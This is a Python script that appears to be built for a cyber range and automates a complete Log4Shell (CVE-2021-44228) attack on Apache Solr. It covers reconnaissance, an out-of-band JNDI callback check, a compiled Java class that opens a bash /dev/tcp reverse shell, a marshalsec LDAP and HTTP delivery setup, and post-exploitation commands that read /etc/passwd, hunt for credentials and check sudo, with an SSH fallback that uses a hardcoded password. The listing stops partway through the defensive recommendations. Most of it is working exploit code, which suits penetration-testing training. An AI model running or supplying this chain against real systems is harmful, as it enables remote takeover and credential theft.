#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║        Log4Shell (CVE-2021-44228) Attack Chain Simulation          ║
║        Authorized Cyber Range Penetration Test Only                 ║
╚══════════════════════════════════════════════════════════════════════╝

Target: Apache Solr 8.11.0 with Log4j 2.14.1
Entry:  JNDI injection via Solr Admin Cores API

Attack Chain:
  Phase 1 → Reconnaissance         (port scan, service fingerprinting)
  Phase 2 → Vulnerability Detection (OOB JNDI callback verification)
  Phase 3 → Exploit Preparation     (compile payload, start infra)
  Phase 4 → Exploitation            (trigger JNDI → LDAP → class load → RCE)
  Phase 5 → Post-Exploitation       (enumerate, persist, exfiltrate)
  Phase 6 → Report & ATT&CK Mapping
"""

import subprocess
import sys
import os
import re
import time
import shutil
import signal
import socket
import threading
import json
import http.server
import socketserver
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

# ── rich ─────────────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding
except ImportError:
    print("[*] Installing 'rich' library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "--break-system-packages",
                        "--quiet", "rich"], check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "rich"], check=True)
        except (subprocess.CalledProcessError, FileNotFoundError):
            print("[!] Cannot install 'rich'. Run: sudo bash attacker_setup/setup_log4shell.sh")
            sys.exit(1)
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.padding import Padding

console = Console()

# ── Global state ──────────────────────────────────────────────────────────────
STATE = {
    "attacker_ip":  None,
    "victim_ip":    None,
    "solr_port":    8983,
    "ldap_port":    1389,
    "http_port":    8888,
    "shell_port":   4444,

    # Infrastructure process handles
    "http_server_proc":  None,
    "ldap_server_proc":  None,
    "listener_proc":     None,

    # Loot
    "loot":  {},
    "shell_received": False,

    "start_time": datetime.now(),
}

# ── MITRE ATT&CK ──────────────────────────────────────────────────────────────
MITRE = [
    ("Reconnaissance",        "T1595.002", "Active Scanning — Vulnerability Scanning"),
    ("Reconnaissance",        "T1592.002", "Gather Victim Host Info — Software"),
    ("Initial Access",        "T1190",     "Exploit Public-Facing Application (Log4Shell)"),
    ("Execution",             "T1059.004", "Command & Scripting Interpreter — Unix Shell"),
    ("Execution",             "T1203",     "Exploitation for Client Execution (JNDI class loading)"),
    ("Discovery",             "T1082",     "System Information Discovery"),
    ("Discovery",             "T1083",     "File and Directory Discovery"),
    ("Discovery",             "T1016",     "System Network Configuration Discovery"),
    ("Credential Access",     "T1552.001", "Unsecured Credentials — Credentials in Files"),
    ("Collection",            "T1005",     "Data from Local System"),
    ("Command & Control",     "T1071.001", "Application Layer Protocol — Web (LDAP/HTTP)"),
    ("Exfiltration",          "T1041",     "Exfiltration Over C2 Channel"),
]

# ─────────────────────────────────────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────────────────────────────────────

def run(cmd: list, timeout: int = 90, stdin_data: str = None) -> tuple:
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=stdin_data)
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Timed out"
    except FileNotFoundError as e:
        return -2, "", f"Tool not found: {e}"
    except Exception as e:
        return -3, "", str(e)


def check_port(ip: str, port: int, timeout: float = 3.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


# ── Pretty-print ──────────────────────────────────────────────────────────────

def phase_header(n: int, title: str, desc: str = ""):
    console.print()
    console.rule(f"[bold magenta]  PHASE {n} — {title}  [/bold magenta]", style="magenta")
    if desc:
        console.print(f"  [dim]{desc}[/dim]")
    console.print()


def step(label: str, title: str):
    console.print(f"  [bold cyan]▶ {label}[/bold cyan]  [white]{title}[/white]")


def ok(msg: str):
    console.print(f"    [bold green]✔[/bold green]  {msg}")


def warn(msg: str):
    console.print(f"    [bold yellow]⚠[/bold yellow]  {msg}")


def err(msg: str):
    console.print(f"    [bold red]✘[/bold red]  {msg}")


def info(msg: str):
    console.print(f"    [dim]→[/dim]  {msg}")


def cmd_display(cmd_str: str):
    console.print(f"    [dim yellow]$[/dim yellow]  [italic dim]{cmd_str}[/italic dim]")

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 0: Banner + Config
# ─────────────────────────────────────────────────────────────────────────────

def banner():
    art = r"""
   __                __ __  _____ __         ____
  / /  ___  ___ ____/ // / / ___// /  ___   / / /
 / /__/ _ \/ _ `/ _  // _ \\__ \/ _ \/ -_) / / /
/____/\___/\_, /\_,_//_//_/___/_//_/\__/ /_/_/
          /___/         CVE-2021-44228
    """
    console.print(Panel(
        f"[bold red]{art}[/bold red]\n"
        "[bold white]Log4Shell Attack Chain — Full Kill Chain Simulation[/bold white]\n\n"
        "[dim]  Target:  Apache Solr 8.11.0 + Log4j 2.14.1[/dim]\n"
        "[dim]  Vector:  JNDI injection via Admin Cores API[/dim]\n"
        "[dim]  Impact:  Unauthenticated Remote Code Execution[/dim]\n"
        f"[dim]  Started: {STATE['start_time'].strftime('%Y-%m-%d %H:%M:%S')}[/dim]",
        title="[bold red]⚔  LOG4SHELL EXPLOITATION[/bold red]",
        border_style="red",
        padding=(1, 4),
    ))
    console.print()


def configure():
    console.print(Panel(
        "[bold]Enter target and attacker configuration.[/bold]\n\n"
        "The attacker IP must be reachable from the victim (for JNDI callback).",
        title="[bold blue]Configuration[/bold blue]",
        border_style="blue",
    ))
    console.print()

    STATE["attacker_ip"] = Prompt.ask(
        "  [bold cyan]Attacker IP[/bold cyan] [dim](this machine, reachable from victim)[/dim]",
        default="10.0.0.1",
    )
    STATE["victim_ip"] = Prompt.ask(
        "  [bold yellow]Victim IP[/bold yellow] [dim](Solr server)[/dim]",
        default="10.0.0.2",
    )
    STATE["solr_port"] = int(Prompt.ask("  [cyan]Solr port[/cyan]", default="8983"))
    STATE["ldap_port"] = int(Prompt.ask("  [cyan]LDAP referral port[/cyan]", default="1389"))
    STATE["http_port"] = int(Prompt.ask("  [cyan]HTTP payload port[/cyan]", default="8888"))
    STATE["shell_port"] = int(Prompt.ask("  [cyan]Reverse shell port[/cyan]", default="4444"))

    console.print()
    t = Table(title="Configuration", box=box.ROUNDED, border_style="blue")
    t.add_column("Parameter", style="cyan")
    t.add_column("Value", style="white")
    t.add_row("Attacker IP", STATE["attacker_ip"])
    t.add_row("Victim IP", STATE["victim_ip"])
    t.add_row("Solr Port", str(STATE["solr_port"]))
    t.add_row("LDAP Port", str(STATE["ldap_port"]))
    t.add_row("HTTP Payload Port", str(STATE["http_port"]))
    t.add_row("Reverse Shell Port", str(STATE["shell_port"]))
    console.print(Padding(t, (0, 2)))
    console.print()

    if not Confirm.ask("  [bold yellow]Launch attack simulation?[/bold yellow]", default=True):
        console.print("[red]Aborted.[/red]")
        sys.exit(0)

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 1: Reconnaissance
# ─────────────────────────────────────────────────────────────────────────────

def phase_recon():
    phase_header(1, "RECONNAISSANCE",
                 "Port scanning, service fingerprinting, Solr version enumeration")

    victim = STATE["victim_ip"]
    port = STATE["solr_port"]

    # 1.1 Tool check
    step("1.1", "Checking available tools")
    tools = {
        "nmap": "Port scanner",
        "curl": "HTTP client",
        "javac": "Java compiler (for payload)",
        "java": "JVM (for marshalsec LDAP server)",
        "mvn": "Maven (to build marshalsec)",
        "nc": "Netcat (reverse shell listener)",
    }
    tt = Table(box=box.SIMPLE, show_header=False, padding=(0, 1))
    tt.add_column("Tool", style="cyan", width=12)
    tt.add_column("Status", width=14)
    tt.add_column("Purpose", style="dim")
    missing_critical = []
    for name, purpose in tools.items():
        found = shutil.which(name) is not None
        status = "[bold green]✔ Found[/bold green]" if found else "[red]✘ Missing[/red]"
        tt.add_row(name, status, purpose)
        if not found and name in ("curl", "java", "javac"):
            missing_critical.append(name)
    console.print(Padding(tt, (0, 4)))
    if missing_critical:
        warn(f"Missing critical tools: {', '.join(missing_critical)}")
        info("Install with: sudo apt install -y default-jdk curl")
    console.print()

    # 1.2 Port scan
    step("1.2", f"Port scanning {victim}")
    ports = "22,80,443,8080,8983,8443"
    cmd_display(f"nmap -sV -sC -p {ports} --open {victim}")
    if shutil.which("nmap"):
        rc, out, _ = run(["nmap", "-sV", "-sC", f"-p{ports}", "--open", victim], timeout=120)
        open_ports = re.findall(r"(\d+)/tcp\s+open\s+(\S+)\s*(.*)", out)
        if open_ports:
            pt = Table(title=f"Open Ports — {victim}", box=box.ROUNDED)
            pt.add_column("Port", style="bold yellow", width=8)
            pt.add_column("Service", style="cyan", width=14)
            pt.add_column("Version / Banner", style="white")
            for p, svc, ver in open_ports:
                pt.add_row(p, svc, ver.strip()[:60])
            console.print(Padding(pt, (0, 4)))
            ok(f"{len(open_ports)} open port(s) found")
            STATE["loot"]["open_ports"] = open_ports
        else:
            warn("No open ports detected — check connectivity")
    else:
        warn("nmap not found, checking Solr port directly")
        if check_port(victim, port):
            ok(f"Port {port} is open")
        else:
            err(f"Port {port} is not reachable")
    console.print()

    # 1.3 Solr version fingerprinting
    step("1.3", "Solr version fingerprinting via Admin API")
    cmd_display(f"curl -s http://{victim}:{port}/solr/admin/info/system?wt=json")
    rc, out, _ = run(["curl", "-s", f"http://{victim}:{port}/solr/admin/info/system?wt=json"],
                     timeout=15)
    if rc == 0 and out.strip():
        try:
            data = json.loads(out)
            solr_ver = data.get("lucene", {}).get("solr-spec-version", "unknown")
            java_ver = data.get("jvm", {}).get("version", "unknown")
            os_name = data.get("system", {}).get("name", "unknown")
            os_ver = data.get("system", {}).get("version", "unknown")

            ft = Table(title="Solr System Info", box=box.ROUNDED)
            ft.add_column("Property", style="cyan")
            ft.add_column("Value", style="white")
            ft.add_row("Solr Version", f"[bold yellow]{solr_ver}[/bold yellow]")
            ft.add_row("JVM Version", java_ver)
            ft.add_row("OS", f"{os_name} {os_ver}")
            console.print(Padding(ft, (0, 4)))

            STATE["loot"]["solr_version"] = solr_ver
            STATE["loot"]["jvm_version"] = java_ver

            if solr_ver.startswith("8.11"):
                ok(f"Solr {solr_ver} — bundles Log4j 2.14.1 — [bold red]VULNERABLE to CVE-2021-44228[/bold red]")
            else:
                warn(f"Solr {solr_ver} — may or may not be vulnerable, proceeding")
        except json.JSONDecodeError:
            warn("Could not parse JSON response")
            info(f"Raw: {out[:200]}")
    else:
        warn("Could not reach Solr Admin API")

    console.print()

    # 1.4 Enumerate Solr cores
    step("1.4", "Enumerating Solr cores")
    cmd_display(f"curl -s http://{victim}:{port}/solr/admin/cores?wt=json")
    rc, out, _ = run(["curl", "-s", f"http://{victim}:{port}/solr/admin/cores?wt=json"],
                     timeout=15)
    if rc == 0 and out.strip():
        try:
            data = json.loads(out)
            cores = list(data.get("status", {}).keys())
            STATE["loot"]["cores"] = cores
            if cores:
                ok(f"Found cores: {', '.join(cores)}")
            else:
                info("No cores found (default installation)")
        except json.JSONDecodeError:
            pass
    console.print()

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 2: Vulnerability Detection (OOB callback)
# ─────────────────────────────────────────────────────────────────────────────

def phase_detection():
    phase_header(2, "VULNERABILITY DETECTION",
                 "Confirm Log4Shell via out-of-band JNDI callback (no exploit needed)")

    victim = STATE["victim_ip"]
    attacker = STATE["attacker_ip"]
    port = STATE["solr_port"]
    ldap_port = STATE["ldap_port"]

    # 2.1 Start a TCP listener to catch the JNDI callback
    step("2.1", f"Starting TCP listener on port {ldap_port} to catch JNDI callback")
    info("If Log4j processes our payload, the victim will connect BACK to us on this port")

    callback_received = threading.Event()
    callback_source = [None]

    def _listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.settimeout(20)
        try:
            srv.bind(("0.0.0.0", ldap_port))
            srv.listen(1)
            conn, addr = srv.accept()
            callback_source[0] = addr[0]
            callback_received.set()
            conn.close()
        except socket.timeout:
            pass
        except OSError as e:
            callback_source[0] = f"error: {e}"
        finally:
            srv.close()

    listener_thread = threading.Thread(target=_listener, daemon=True)
    listener_thread.start()
    time.sleep(0.5)
    ok(f"Listening on 0.0.0.0:{ldap_port}")

    # 2.2 Send JNDI payload via Solr Admin Cores API
    step("2.2", "Sending JNDI test payload via Solr Admin Cores API")
    payload = f"${{jndi:ldap://{attacker}:{ldap_port}/test}}"
    cmd_display(
        f"curl -G 'http://{victim}:{port}/solr/admin/cores' "
        f"--data-urlencode 'action=STATUS' "
        f"--data-urlencode 'core={payload}'"
    )
    info(f"Payload: [bold yellow]{payload}[/bold yellow]")
    info("Important: using --data-urlencode to preserve ${{...}} syntax")

    rc, out, _ = run([
        "curl", "-s", "-G",
        f"http://{victim}:{port}/solr/admin/cores",
        "--data-urlencode", "action=STATUS",
        "--data-urlencode", f"core={payload}",
    ], timeout=15)

    # 2.3 Check callback
    step("2.3", "Waiting for JNDI callback from victim...")
    callback_received.wait(timeout=15)
    listener_thread.join(timeout=2)

    if callback_received.is_set():
        ok(f"[bold green]CALLBACK RECEIVED from {callback_source[0]}![/bold green]")
        ok("[bold red]CVE-2021-44228 CONFIRMED — target is vulnerable to Log4Shell[/bold red]")
        STATE["loot"]["vuln_confirmed"] = True

        console.print(Panel(
            f"  Victim [yellow]{victim}[/yellow] initiated an LDAP connection to\n"
            f"  attacker [cyan]{attacker}:{ldap_port}[/cyan] in response to the JNDI payload.\n\n"
            f"  This proves Log4j evaluated [bold]${{jndi:ldap://...}}[/bold] from the\n"
            f"  [bold]core[/bold] parameter of the Admin Cores API.",
            title="[bold green]✔ Vulnerability Confirmed[/bold green]",
            border_style="green",
            padding=(1, 3),
        ))
    else:
        warn("No callback received within 15 seconds")
        info("Possible causes: firewall, wrong IP, Solr not logging this parameter")
        if Confirm.ask("  Continue to exploitation anyway?", default=True):
            STATE["loot"]["vuln_confirmed"] = False
        else:
            console.print("[red]Aborted.[/red]")
            sys.exit(1)

    console.print()

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 3: Exploit Preparation
# ─────────────────────────────────────────────────────────────────────────────

def phase_preparation():
    phase_header(3, "EXPLOIT PREPARATION",
                 "Compile malicious Java class, build marshalsec, start infrastructure")

    attacker = STATE["attacker_ip"]
    http_port = STATE["http_port"]
    ldap_port = STATE["ldap_port"]
    shell_port = STATE["shell_port"]

    exploit_dir = Path("/tmp/log4shell_exploit")
    exploit_dir.mkdir(exist_ok=True)

    # 3.1 Compile malicious Java class
    step("3.1", "Compiling malicious Java class (reverse shell payload)")
    java_src = f"""\
public class Exploit {{
    static {{
        try {{
            String[] cmd = {{"/bin/bash", "-c", "bash -i >& /dev/tcp/{attacker}/{shell_port} 0>&1"}};
            Runtime.getRuntime().exec(cmd);
        }} catch (Exception e) {{}}
    }}
}}
"""
    src_path = exploit_dir / "Exploit.java"
    src_path.write_text(java_src)
    info(f"Payload: bash reverse shell → {attacker}:{shell_port}")

    # Try --release 11 first, fall back to default
    cmd_display(f"javac --release 11 {src_path}")
    rc, out, stderr = run(["javac", "--release", "11", str(src_path)], timeout=30)
    if rc != 0:
        info("--release 11 failed, trying default javac")
        rc, out, stderr = run(["javac", str(src_path)], timeout=30)

    class_path = exploit_dir / "Exploit.class"
    if class_path.exists():
        ok(f"Exploit.class compiled ({class_path.stat().st_size} bytes)")
    else:
        err(f"Compilation failed: {stderr[:200]}")
        return

    console.print()

    # 3.2 Build marshalsec (LDAP referral server)
    step("3.2", "Checking marshalsec LDAP referral server")
    marshalsec_jar = Path.home() / "marshalsec" / "target" / "marshalsec-0.0.3-SNAPSHOT-all.jar"

    if not marshalsec_jar.exists():
        info("marshalsec not found, building from source...")
        marshalsec_dir = Path.home() / "marshalsec"
        if not marshalsec_dir.exists():
            cmd_display("git clone https://github.com/mbechler/marshalsec ~/marshalsec")
            rc, _, stderr = run(
                ["git", "clone", "https://github.com/mbechler/marshalsec",
                 str(marshalsec_dir)],
                timeout=120,
            )
            if rc != 0:
                err(f"git clone failed: {stderr[:200]}")
                return

        cmd_display("cd ~/marshalsec && mvn clean package -DskipTests -q")
        rc, _, stderr = run(
            ["mvn", "clean", "package", "-DskipTests", "-q"],
            timeout=300,
        )
        # mvn runs in cwd, need to specify pom
        if rc != 0:
            rc, _, stderr = run(
                ["mvn", "-f", str(marshalsec_dir / "pom.xml"),
                 "clean", "package", "-DskipTests", "-q"],
                timeout=300,
            )
        if not marshalsec_jar.exists():
            err("marshalsec build failed")
            err(f"Output: {stderr[:300]}")
            info("Manual fix: cd ~/marshalsec && mvn clean package -DskipTests")
            if not Confirm.ask("  Continue without marshalsec?", default=False):
                sys.exit(1)
            return

    ok(f"marshalsec ready: {marshalsec_jar}")
    STATE["loot"]["marshalsec_jar"] = str(marshalsec_jar)
    console.print()

    # 3.3 Start HTTP server hosting Exploit.class
    step("3.3", f"Starting HTTP server on port {http_port} (hosts Exploit.class)")
    cmd_display(f"python3 -m http.server {http_port}  (from {exploit_dir})")

    # Kill any existing process on this port
    run(["fuser", "-k", f"{http_port}/tcp"], timeout=5)
    time.sleep(0.5)

    http_proc = subprocess.Popen(
        [sys.executable, "-m", "http.server", str(http_port)],
        cwd=str(exploit_dir),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    STATE["http_server_proc"] = http_proc
    time.sleep(1)

    if http_proc.poll() is None:
        ok(f"HTTP server running (PID {http_proc.pid}) — serving {exploit_dir}")
    else:
        err("HTTP server failed to start")
        return

    console.print()

    # 3.4 Start marshalsec LDAP referral server
    step("3.4", f"Starting marshalsec LDAP referral server on port {ldap_port}")
    referral_url = f"http://{attacker}:{http_port}/#Exploit"
    cmd_display(
        f"java -cp {marshalsec_jar} marshalsec.jndi.LDAPRefServer "
        f'"{referral_url}" {ldap_port}'
    )

    run(["fuser", "-k", f"{ldap_port}/tcp"], timeout=5)
    time.sleep(0.5)

    ldap_proc = subprocess.Popen(
        ["java", "-cp", str(marshalsec_jar),
         "marshalsec.jndi.LDAPRefServer", referral_url, str(ldap_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    STATE["ldap_server_proc"] = ldap_proc
    time.sleep(2)

    if ldap_proc.poll() is None:
        ok(f"LDAP referral server running (PID {ldap_proc.pid})")
        info(f"Referral URL: {referral_url}")
    else:
        out = ldap_proc.stdout.read().decode()[:300]
        err(f"LDAP server failed: {out}")
        return

    console.print()

    # 3.5 Summary of exploit infrastructure
    console.print(Panel(
        f"  [bold]HTTP Server[/bold]   → 0.0.0.0:{http_port}  (serves Exploit.class)\n"
        f"  [bold]LDAP Server[/bold]   → 0.0.0.0:{ldap_port}  (redirects to HTTP → Exploit.class)\n"
        f"  [bold]Shell Listener[/bold] → will start on 0.0.0.0:{shell_port} in Phase 4\n\n"
        f"  [dim]Flow: victim JNDI → LDAP:{ldap_port} → referral → HTTP:{http_port}/Exploit.class → RCE[/dim]",
        title="[bold cyan]Exploit Infrastructure Ready[/bold cyan]",
        border_style="cyan",
        padding=(1, 3),
    ))
    console.print()

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 4: Exploitation
# ─────────────────────────────────────────────────────────────────────────────

def phase_exploit():
    phase_header(4, "EXPLOITATION",
                 "Trigger JNDI lookup → LDAP referral → class load → reverse shell")

    victim = STATE["victim_ip"]
    attacker = STATE["attacker_ip"]
    port = STATE["solr_port"]
    ldap_port = STATE["ldap_port"]
    shell_port = STATE["shell_port"]

    # 4.1 Start reverse shell listener
    step("4.1", f"Starting reverse shell listener on port {shell_port}")
    cmd_display(f"nc -lvnp {shell_port}")

    run(["fuser", "-k", f"{shell_port}/tcp"], timeout=5)
    time.sleep(0.5)

    nc_bin = shutil.which("ncat") or shutil.which("nc")
    if not nc_bin:
        err("Neither ncat nor nc found — cannot start listener")
        return

    listener_proc = subprocess.Popen(
        [nc_bin, "-lvnp", str(shell_port)],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    STATE["listener_proc"] = listener_proc
    time.sleep(1)
    ok(f"Listener active on 0.0.0.0:{shell_port} (PID {listener_proc.pid})")
    console.print()

    # 4.2 Send exploit payload
    step("4.2", "Sending exploit JNDI payload to trigger class loading")
    payload = f"${{jndi:ldap://{attacker}:{ldap_port}/Exploit}}"
    cmd_display(
        f"curl -G 'http://{victim}:{port}/solr/admin/cores' "
        f"--data-urlencode 'action=STATUS' "
        f"--data-urlencode 'core={payload}'"
    )
    info(f"Payload: [bold red]{payload}[/bold red]")

    console.print()
    console.print(Panel(
        f"  1. Solr logs the [bold]core[/bold] parameter via Log4j\n"
        f"  2. Log4j evaluates [yellow]${{jndi:ldap://{attacker}:{ldap_port}/Exploit}}[/yellow]\n"
        f"  3. Log4j connects to attacker LDAP server (marshalsec)\n"
        f"  4. marshalsec returns referral → [cyan]http://{attacker}:{STATE['http_port']}/#Exploit[/cyan]\n"
        f"  5. JVM downloads [bold]Exploit.class[/bold] from attacker HTTP server\n"
        f"  6. JVM instantiates the class → static initializer executes\n"
        f"  7. Reverse shell connects back to [green]{attacker}:{shell_port}[/green]",
        title="[bold]Exploit Flow[/bold]",
        border_style="yellow",
        padding=(1, 3),
    ))
    console.print()

    rc, out, _ = run([
        "curl", "-s", "-G",
        f"http://{victim}:{port}/solr/admin/cores",
        "--data-urlencode", "action=STATUS",
        "--data-urlencode", f"core={payload}",
    ], timeout=15)

    # 4.3 Wait for reverse shell
    step("4.3", "Waiting for reverse shell connection...")
    info(f"The victim JVM should fetch Exploit.class and execute the reverse shell")

    shell_connected = False
    for i in range(20):
        time.sleep(1)
        console.print(f"    [dim]  Waiting... ({i+1}s)[/dim]", end="\r")
        # Check if nc received a connection by checking if we can write to it
        if listener_proc.poll() is not None:
            break
        # Try to detect connection by checking socket
        rc_check, out_check, _ = run(["ss", "-tnp", f"sport = :{shell_port}"], timeout=5)
        if "ESTAB" in out_check:
            shell_connected = True
            break

    console.print()  # clear the waiting line

    if shell_connected:
        ok("[bold green]REVERSE SHELL RECEIVED![/bold green]")
        STATE["shell_received"] = True

        console.print(Panel(
            f"[bold green]Shell established as solr user on {victim}[/bold green]\n\n"
            f"  The listener on port {shell_port} now has an interactive shell.\n"
            f"  The attacker has achieved [bold red]Remote Code Execution[/bold red]\n"
            f"  via Log4Shell (CVE-2021-44228).",
            title="[bold red]⚔ INITIAL ACCESS ACHIEVED[/bold red]",
            border_style="red",
            padding=(1, 3),
        ))
    else:
        warn("Shell connection not detected automatically")
        info(f"Check manually: the nc listener on port {shell_port} may have a shell")
        info("If not, verify marshalsec and HTTP server logs")
        STATE["shell_received"] = Confirm.ask("  Did you receive a reverse shell?", default=False)

    console.print()

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 5: Post-Exploitation
# ─────────────────────────────────────────────────────────────────────────────

def phase_post_exploit():
    phase_header(5, "POST-EXPLOITATION",
                 "System enumeration, credential harvesting, data exfiltration")

    victim = STATE["victim_ip"]
    listener = STATE.get("listener_proc")

    if not STATE["shell_received"] or listener is None or listener.poll() is not None:
        info("No active shell — running post-exploitation commands via SSH fallback")
        _post_exploit_via_ssh()
        return

    # Run commands through the reverse shell
    def shell_exec(cmd: str, timeout: int = 10) -> str:
        try:
            listener.stdin.write(f"{cmd}\n".encode())
            listener.stdin.flush()
            time.sleep(2)
            # Read available output
            import select
            output = ""
            while select.select([listener.stdout], [], [], 0.5)[0]:
                data = listener.stdout.read1(4096).decode(errors="replace")
                output += data
            return output
        except Exception as e:
            return f"Error: {e}"

    post_commands = [
        ("5.1", "System Information",        "id; hostname; uname -a"),
        ("5.2", "Network Configuration",     "ip addr show; ip route"),
        ("5.3", "Running Services",          "ps aux | head -20"),
        ("5.4", "Solr Configuration",        "cat /etc/default/solr.in.sh 2>/dev/null"),
        ("5.5", "Search for Credentials",    "find /opt/solr -name '*.properties' -exec grep -l password {} \\; 2>/dev/null | head -5"),
        ("5.6", "Check sudo Privileges",     "sudo -l 2>/dev/null || echo 'No sudo'"),
        ("5.7", "Read /etc/passwd",          "cat /etc/passwd | grep -v nologin | grep -v false"),
    ]

    for label, title, cmd in post_commands:
        step(label, title)
        cmd_display(cmd)
        output = shell_exec(cmd)
        if output.strip():
            for line in output.strip().splitlines()[:8]:
                console.print(f"      [dim white]{line}[/dim white]")
        console.print()

    STATE["loot"]["post_exploit"] = "completed"


def _post_exploit_via_ssh():
    """Fallback: run post-exploitation via SSH if reverse shell is not available."""
    victim = STATE["victim_ip"]

    step("5.F", "Fallback: running post-exploitation via SSH (solruser)")
    info("Using known credentials: solruser / solr123")

    if not shutil.which("sshpass"):
        warn("sshpass not installed — install with: sudo apt install sshpass")
        info("Skipping SSH-based post-exploitation")
        return

    commands = [
        ("System Info",     "id; hostname; uname -a"),
        ("Network",         "ip -br addr show"),
        ("Solr Process",    "ps aux | grep solr | grep -v grep | head -5"),
        ("Solr Config",     "cat /etc/default/solr.in.sh 2>/dev/null | head -10"),
        ("Users",           "cat /etc/passwd | grep -v nologin | grep -v false"),
        ("Flag File",       "cat /root/TARGET_INFO.txt 2>/dev/null | head -10 || echo 'No root access'"),
    ]

    for label, cmd in commands:
        info(f"[bold]{label}[/bold]")
        cmd_display(f"sshpass -p 'solr123' ssh solruser@{victim} '{cmd}'")
        rc, out, _ = run(
            ["sshpass", "-p", "solr123",
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8",
             f"solruser@{victim}", cmd],
            timeout=15,
        )
        if rc == 0:
            for line in out.strip().splitlines()[:6]:
                console.print(f"      [dim white]{line}[/dim white]")
        else:
            warn(f"Command failed (rc={rc})")
        console.print()

    STATE["loot"]["post_exploit"] = "ssh_fallback"

# ─────────────────────────────────────────────────────────────────────────────
#  Phase 6: Report
# ─────────────────────────────────────────────────────────────────────────────

def phase_report():
    phase_header(6, "OPERATION REPORT",
                 "Summary, ATT&CK mapping, defensive recommendations")

    duration = datetime.now() - STATE["start_time"]
    vuln_confirmed = STATE["loot"].get("vuln_confirmed", False)
    solr_ver = STATE["loot"].get("solr_version", "unknown")

    console.print(Panel(
        f"[bold]Log4Shell Attack Simulation Complete[/bold]\n\n"
        f"  Duration           : {str(duration).split('.')[0]}\n"
        f"  Target             : [yellow]{STATE['victim_ip']}:{STATE['solr_port']}[/yellow]\n"
        f"  Service            : Apache Solr [bold]{solr_ver}[/bold]\n"
        f"  Vulnerability      : [bold red]CVE-2021-44228 (Log4Shell)[/bold red]\n"
        f"  CVSS               : [bold red]10.0 Critical[/bold red]\n"
        f"  OOB Callback       : {'[bold green]Confirmed[/bold green]' if vuln_confirmed else '[yellow]Not confirmed[/yellow]'}\n"
        f"  RCE Achieved       : {'[bold red]YES[/bold red]' if STATE['shell_received'] else '[yellow]Manual verification needed[/yellow]'}\n"
        f"  Injection Point    : [cyan]core[/cyan] parameter of Admin Cores API\n"
        f"  Payload Delivery   : LDAP referral → HTTP class loading",
        title="[bold green]✔  OPERATION SUMMARY[/bold green]",
        border_style="bold green",
        padding=(1, 4),
    ))
    console.print()

    # Attack timeline
    console.rule("[bold blue]Attack Chain Timeline[/bold blue]", style="blue")
    tlt = Table(box=box.SIMPLE_HEAD)
    tlt.add_column("Phase", style="cyan", width=10)
    tlt.add_column("Name", style="white", width=28)
    tlt.add_column("Technique", style="dim")
    tlt.add_column("Result", width=10)
    timeline = [
        ("Phase 1", "Reconnaissance",         "nmap + Solr Admin API fingerprint"),
        ("Phase 2", "Vulnerability Detection", "OOB JNDI callback verification"),
        ("Phase 3", "Exploit Preparation",     "Compile payload + start LDAP/HTTP infra"),
        ("Phase 4", "Exploitation",            "JNDI → LDAP → class load → reverse shell"),
        ("Phase 5", "Post-Exploitation",       "System enum, credential search, data access"),
    ]
    for phase, name, detail in timeline:
        tlt.add_row(phase, name, detail, "[bold green]✔[/bold green]")
    console.print(Padding(tlt, (0, 2)))
    console.print()

    # Kill chain diagram
    console.rule("[bold yellow]Kill Chain Flow[/bold yellow]", style="yellow")
    console.print("""
  [cyan]Attacker[/cyan] sends JNDI payload in HTTP request
      │
      ▼
  [yellow]Solr[/yellow] logs the parameter via Log4j 2.14.1
      │
      ▼
  [yellow]Log4j[/yellow] evaluates ${{jndi:ldap://attacker:1389/Exploit}}
      │
      ▼
  [yellow]JVM[/yellow] connects to attacker LDAP server (marshalsec)
      │
      ▼
  [cyan]marshalsec[/cyan] returns referral → http://attacker:8888/#Exploit
      │
      ▼
  [yellow]JVM[/yellow] downloads Exploit.class from attacker HTTP server
      │
      ▼
  [yellow]JVM[/yellow] instantiates Exploit → static {} block executes
      │
      ▼
  [red]Reverse shell[/red] connects back to attacker:4444
      │
      ▼
  [bold red]FULL RCE as solr user[/bold red]
    """)

    # MITRE ATT&CK
    console.rule("[bold white]MITRE ATT&CK Coverage[/bold white]", style="white")
    mt = Table(box=box.SIMPLE, title="Techniques Used")
    mt.add_column("Tactic", style="magenta", width=22)
    mt.add_column("Technique ID", style="cyan", width=14)
    mt.add_column("Technique Name", style="white")
    for tactic, tid, name in MITRE:
        mt.add_row(tactic, tid, name)
    console.print(Padding(mt, (0, 2)))
    console.print()

    # Blue team recommendations
    console.rule("[bold green]Blue Team Defensive Recommendations[/bold green]", style="green")
    recs = [
        ("T1190",     "Upgrade Log4j to 2.17.1+ or remove JndiLookup.class from classpath"),
        ("T1190",     "Set -Dlog4j2.formatMsgNoLookups=true as JVM argument"),
        ("T1190",     "Block outbound LDAP/RMI (ports 1389, 1099) at the firewall"),
